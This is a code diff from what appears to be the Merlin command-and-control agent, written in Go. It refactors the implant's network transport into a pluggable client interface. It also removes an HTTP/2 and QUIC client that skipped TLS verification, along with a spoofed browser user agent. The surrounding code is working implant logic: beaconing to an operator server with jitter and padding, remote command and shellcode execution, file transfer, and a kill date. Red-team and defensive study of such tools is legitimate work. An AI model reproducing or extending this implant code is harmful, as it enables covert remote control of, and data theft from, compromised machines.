@@ -21,7 +21,6 @@ import (
 	// Standard
 	"bytes"
 	"crypto/sha1" // #nosec G505
-	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -29,7 +28,6 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net"
-	"net/http"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -38,16 +36,15 @@ import (
 	"time"
 
 	// 3rd Party
+
 	"github.com/fatih/color"
-	"github.com/lucas-clemente/quic-go"
-	"github.com/lucas-clemente/quic-go/h2quic"
-	"github.com/satori/go.uuid"
-	"golang.org/x/net/http2"
+	uuid "github.com/satori/go.uuid"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
+	merlin "github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/core"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"github.com/Ne0nd0g/merlin/pkg/transport"
 )
 
 // GLOBAL VARIABLES
@@ -57,34 +54,33 @@ var build = "nonRelease" // build is the build number of the Merlin Agent progra
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
-	ID            uuid.UUID     // ID is a Universally Unique Identifier per agent
-	Platform      string        // Platform is the operating system platform the agent is running on (i.e. windows)
-	Architecture  string        // Architecture is the operating system architecture the agent is running on (i.e. amd64)
-	UserName      string        // UserName is the username that the agent is running as
-	UserGUID      string        // UserGUID is a Globally Unique Identifier associated with username
-	HostName      string        // HostName is the computer's host name
-	Ips           []string      // Ips is a slice of all the IP addresses assigned to the host's interfaces
-	Pid           int           // Pid is the Process ID that the agent is running under
-	iCheckIn      time.Time     // iCheckIn is a timestamp of the agent's initial check in time
-	sCheckIn      time.Time     // sCheckIn is a timestamp of the agent's last status check in time
-	Version       string        // Version is the version number of the Merlin Agent program
-	Build         string        // Build is the build number of the Merlin Agent program
-	WaitTime      time.Duration // WaitTime is how much time the agent waits in-between checking in
-	PaddingMax    int           // PaddingMax is the maximum size allowed for a randomly selected message padding length
-	MaxRetry      int           // MaxRetry is the maximum amount of failed check in attempts before the agent quits
-	FailedCheckin int           // FailedCheckin is a count of the total number of failed check ins
-	Skew          int64         // Skew is size of skew added to each WaitTime to vary check in attempts
-	Verbose       bool          // Verbose enables verbose messages to standard out
-	Debug         bool          // Debug enables debug messages to standard out
-	Proto         string        // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
-	Client        *http.Client  // Client is an http.Client object used to make HTTP connections for agent communications
-	UserAgent     string        // UserAgent is the user agent string used with HTTP connections
-	initial       bool          // initial identifies if the agent has successfully completed the first initial check in
-	KillDate      int64         // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
+	ID            uuid.UUID                  // ID is a Universally Unique Identifier per agent
+	Platform      string                     // Platform is the operating system platform the agent is running on (i.e. windows)
+	Architecture  string                     // Architecture is the operating system architecture the agent is running on (i.e. amd64)
+	UserName      string                     // UserName is the username that the agent is running as
+	UserGUID      string                     // UserGUID is a Globally Unique Identifier associated with username
+	HostName      string                     // HostName is the computer's host name
+	Ips           []string                   // Ips is a slice of all the IP addresses assigned to the host's interfaces
+	Pid           int                        // Pid is the Process ID that the agent is running under
+	iCheckIn      time.Time                  // iCheckIn is a timestamp of the agent's initial check in time
+	sCheckIn      time.Time                  // sCheckIn is a timestamp of the agent's last status check in time
+	Version       string                     // Version is the version number of the Merlin Agent program
+	Build         string                     // Build is the build number of the Merlin Agent program
+	WaitTime      time.Duration              // WaitTime is how much time the agent waits in-between checking in
+	PaddingMax    int                        // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	MaxRetry      int                        // MaxRetry is the maximum amount of failed check in attempts before the agent quits
+	FailedCheckin int                        // FailedCheckin is a count of the total number of failed check ins
+	Skew          int64                      // Skew is size of skew added to each WaitTime to vary check in attempts
+	Verbose       bool                       // Verbose enables verbose messages to standard out
+	Debug         bool                       // Debug enables debug messages to standard out
+	Proto         string                     // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
+	Client        transport.MerlinCommClient // Client is an interfaced used to send data to the merlin server
+	initial       bool                       // initial identifies if the agent has successfully completed the first initial check in
+	KillDate      int64                      // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, verbose bool, debug bool) Agent {
+func New(protocol string, verbose bool, debug bool, client transport.MerlinCommClient) Agent {
 	if debug {
 		message("debug", "Entering agent.init() function")
 	}
@@ -101,9 +97,9 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		Verbose:      verbose,
 		Debug:        debug,
 		Proto:        protocol,
-		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
 		initial:      false,
 		KillDate:     0,
+		Client:       client,
 	}
 
 	u, errU := user.Current()
@@ -144,15 +140,6 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		}
 	}
 
-	client, errClient := getClient(a.Proto)
-	if errClient == nil {
-		a.Client = client
-	} else {
-		if a.Verbose {
-			message("warn", errClient.Error())
-		}
-	}
-
 	if a.Verbose {
 		message("info", "Host Information:")
 		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
@@ -186,9 +173,9 @@ func (a *Agent) Run(server string) {
 				if a.Verbose {
 					message("note", "Checking in")
 				}
-				go a.statusCheckIn(server, a.Client)
+				go a.statusCheckIn(server)
 			} else {
-				a.initial = a.initialCheckIn(server, a.Client)
+				a.initial = a.initialCheckIn(server)
 			}
 			if a.FailedCheckin >= a.MaxRetry {
 				if a.Verbose {
@@ -214,8 +201,7 @@ func (a *Agent) Run(server string) {
 	}
 }
 
-func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
-
+func (a *Agent) initialCheckIn(host string) bool {
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
 	}
@@ -282,20 +268,11 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
 	}
-	req, reqErr := http.NewRequest("POST", host, b)
-	if reqErr != nil {
-		if a.Verbose {
-			message("warn", reqErr.Error())
-		}
-	}
-	req.Header.Set("User-Agent", a.UserAgent)
-	req.Header.Set("Content-Type", "application/json; charset=utf-8")
-	resp, err := client.Do(req)
-
+	bod, err := a.Client.Do(b)
 	if err != nil {
 		a.FailedCheckin++
 		if a.Debug {
-			message("warn", "There was an error with the HTTP client while performing a POST:")
+			message("warn", "There was an error with the client while sending data:")
 			message("warn", fmt.Sprintf("%s", err.Error()))
 		}
 		if a.Verbose {
@@ -306,30 +283,32 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 		}
 		return false
 	}
-	if a.Debug {
-		message("debug", "HTTP Response:")
-		message("debug", fmt.Sprintf("%+v", resp))
-	}
-	if resp.StatusCode != 200 {
+	resp, err := ioutil.ReadAll(bod.Body)
+
+	if err != nil {
 		a.FailedCheckin++
 		if a.Verbose {
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
 		}
 		if a.Debug {
 			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
+			message("warn", "Got an error during reading of the server response: "+err.Error())
 		}
 		if a.Debug {
 			message("debug", "Leaving initialCheckIn function, returning False.")
 		}
 		return false
 	}
+	if a.Debug {
+		message("debug", "Response:")
+		message("debug", fmt.Sprintf("%+v", resp))
+	}
 	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
 		if a.Verbose {
 			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
 		}
 		a.FailedCheckin = 0
-		go a.agentInfo(host, a.Client)
+		go a.agentInfo(host)
 	}
 	if a.Debug {
 		message("debug", "Leaving initialCheckIn function, returning True")
@@ -337,7 +316,7 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 	return true
 }
 
-func (a *Agent) statusCheckIn(host string, client *http.Client) {
+func (a *Agent) statusCheckIn(host string) {
 	g := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
@@ -358,21 +337,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 		message("note", fmt.Sprintf("Connecting to web server at %s for status check in.", host))
 	}
 
-	req, reqErr := http.NewRequest("POST", host, b)
-	if reqErr != nil {
-		if a.Verbose {
-			message("warn", reqErr.Error())
-		}
-	}
-	req.Header.Set("User-Agent", a.UserAgent)
-	req.Header.Set("Content-Type", "application/json; charset=utf-8")
-	resp, err := client.Do(req)
+	resp, err := a.Client.Do(b)
 
 	if err != nil {
 		if a.Debug {
-			message("warn", "There was an error with the HTTP Response:")
-			message("warn", fmt.Sprintf("%s", err.Error())) // On Mac I get "read: connection reset by peer" here but not on other platforms
-		} // Only does this with a 10s Sleep
+			message("warn", "There was an error with the Response:")
+			message("warn", fmt.Sprintf("%s", err.Error()))
+		}
 		a.FailedCheckin++
 		if a.Verbose {
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
@@ -381,24 +352,12 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 	}
 
 	if a.Debug {
-		message("debug", "HTTP Response:")
-		message("debug", fmt.Sprintf("ContentLength: %d", resp.ContentLength))
+		message("debug", "Response:")
+		message("debug", fmt.Sprintf("ContentLength: %d", resp.BodyLen))
 		message("debug", fmt.Sprintf("%+v", resp))
 	}
 
-	if resp.StatusCode != 200 {
-		a.FailedCheckin++
-		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
-		}
-		return
-	}
-
-	if resp.ContentLength != 0 {
+	if resp.BodyLen != 0 {
 		var payload json.RawMessage
 		j := messages.Base{
 			Payload: &payload,
@@ -579,18 +538,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				}
 				break
 			}
-			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
-			if respErr != nil {
+			_, err := a.Client.Do(b2)
+			if err != nil {
 				if a.Verbose {
 					message("warn", "There was an error sending the FileTransfer message to the server")
-					message("warn", fmt.Sprintf("%s", respErr.Error()))
+					message("warn", fmt.Sprintf("%s", err.Error()))
 				}
 				break
-			}
-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-				}
 			}
 		case "CmdPayload":
 			var p messages.CmdPayload
@@ -636,19 +590,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			if a.Verbose {
 				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
 			}
-			resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
-			if errR != nil {
+			_, err = a.Client.Do(b2)
+			if err != nil {
 				if a.Verbose {
 					message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
-						errR.Error()))
+						err.Error()))
 				}
 				break
-			}
-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
-						resp2.StatusCode))
-				}
 			}
 		case "ServerOk":
 			if a.Verbose {
@@ -765,18 +713,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					}
 					break
 				}
-				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
-				if respErr != nil {
+				_, err = a.Client.Do(b2)
+				if err != nil {
 					if a.Verbose {
 						message("warn", "There was an error sending the FileTransfer message to the server")
-						message("warn", fmt.Sprintf("%s", respErr.Error()))
+						message("warn", fmt.Sprintf("%s", err.Error()))
 					}
 					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
 				}
 
 			}
@@ -812,7 +755,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				}
 				if t > 0 {
 					a.WaitTime = t
-					a.agentInfo(host, client)
+					a.agentInfo(host)
 				} else {
 					if a.Verbose {
 						message("warn", "The agent was provided with a time that was not greater than zero.")
@@ -831,7 +774,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
 				}
 				a.Skew = t
-				a.agentInfo(host, client)
+				a.agentInfo(host)
 			case "padding":
 				t, err := strconv.Atoi(p.Args)
 				if err != nil {
@@ -844,7 +787,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
 				}
 				a.PaddingMax = t
-				a.agentInfo(host, client)
+				a.agentInfo(host)
 			case "initialize":
 				if a.Verbose {
 					message("note", "Received agent re-initialize message")
@@ -863,7 +806,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("note", fmt.Sprintf("Setting agent max retries to %d", t))
 				}
 				a.MaxRetry = t
-				a.agentInfo(host, client)
+				a.agentInfo(host)
 			case "killdate":
 				d, err := strconv.Atoi(p.Args)
 				if err != nil {
@@ -878,7 +821,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					message("info", fmt.Sprintf("Set Kill Date to: %s",
 						time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
 				}
-				a.agentInfo(host, client)
+				a.agentInfo(host)
 			default:
 				if a.Verbose {
 					message("warn", fmt.Sprintf("Unknown AgentControl message type received %s", p.Command))
@@ -954,20 +897,14 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 					"\r\nSTDOUT:\r\n%s\r\nSTDERR:\r\n%s", s.Job, so, se))
 			}
 
-			resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
+			_, err := a.Client.Do(b2)
 
-			if errPost != nil {
+			if err != nil {
 				if a.Verbose {
 					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-					message("warn", errPost.Error())
+					message("warn", err.Error())
 				}
 				break
-			}
-
-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-				}
 			}
 		case "NativeCmd":
 			var p messages.NativeCmd
@@ -1023,20 +960,15 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", listing))
 				}
-				resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
-				if errR != nil {
+				_, err = a.Client.Do(b2)
+				if err != nil {
 					if a.Verbose {
 						message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
-							errR.Error()))
+							err.Error()))
 					}
 					break
 				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
-							resp2.StatusCode))
-					}
-				}
+
 			case "cd":
 				var se string
 				var stdout string
@@ -1087,19 +1019,15 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", stdout))
 				}
-				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
-				if errPost != nil {
+				_, err = a.Client.Do(b2)
+				if err != nil {
 					if a.Verbose {
 						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-						message("warn", errPost.Error())
+						message("warn", err.Error())
 					}
 					break
 				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
-				}
+
 			case "pwd":
 				var se string
 				dir, err := os.Getwd()
@@ -1142,18 +1070,13 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 				if a.Verbose {
 					message("note", fmt.Sprintf("Sending response to server: %s", dir))
 				}
-				resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
-				if errPost != nil {
+				_, err = a.Client.Do(b2)
+				if err != nil {
 					if a.Verbose {
 						message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-						message("warn", errPost.Error())
+						message("warn", err.Error())
 					}
 					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
 				}
 			default:
 				if a.Verbose {
@@ -1162,37 +1085,6 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 			}
 		}
 	}
-}
-
-// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
-func getClient(protocol string) (*http.Client, error) {
-
-	/* #nosec G402 */
-	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
-	// Setup TLS configuration
-	TLSConfig := &tls.Config{
-		MinVersion:         tls.VersionTLS12,
-		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
-		CipherSuites: []uint16{
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
-		},
-		NextProtos: []string{protocol},
-	}
-
-	if protocol == "hq" {
-		transport := &h2quic.RoundTripper{
-			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
-			TLSClientConfig: TLSConfig,
-		}
-		return &http.Client{Transport: transport}, nil
-	} else if protocol == "h2" {
-		transport := &http2.Transport{
-			TLSClientConfig: TLSConfig,
-		}
-		return &http.Client{Transport: transport}, nil
-	}
-	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 }
 
 func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr string) {
@@ -1302,7 +1194,7 @@ func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 	}
 }
 
-func (a *Agent) agentInfo(host string, client *http.Client) {
+func (a *Agent) agentInfo(host string) {
 	i := messages.AgentInfo{
 		Version:       merlin.Version,
 		Build:         build,
@@ -1343,12 +1235,12 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 	if a.Verbose {
 		message("note", fmt.Sprintf("Connecting to web server at %s to update agent configuration information.", host))
 	}
-	resp, err := client.Post(host, "application/json; charset=utf-8", b)
+	bod, err := a.Client.Do(b)
 
 	if err != nil {
 		a.FailedCheckin++
 		if a.Debug {
-			message("warn", "There was an error with the HTTP client while performing a POST:")
+			message("warn", "There was an error with the client while sending data:")
 			message("warn", fmt.Sprintf(err.Error()))
 		}
 		if a.Verbose {
@@ -1357,20 +1249,14 @@ func (a *Agent) agentInfo(host string, client *http.Client) {
 		return
 	}
 	if a.Debug {
-		message("debug", "HTTP Response:")
+		message("debug", "Response:")
+		resp, err := ioutil.ReadAll(bod.Body)
+		if err != nil {
+			message("warn", fmt.Sprintf("Error during reading of response body: "+err.Error()))
+		}
 		message("warn", fmt.Sprintf("%+v", resp))
 	}
-	if resp.StatusCode != 200 {
-		a.FailedCheckin++
-		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
-		}
-		return
-	}
+
 	a.FailedCheckin = 0
 }
 
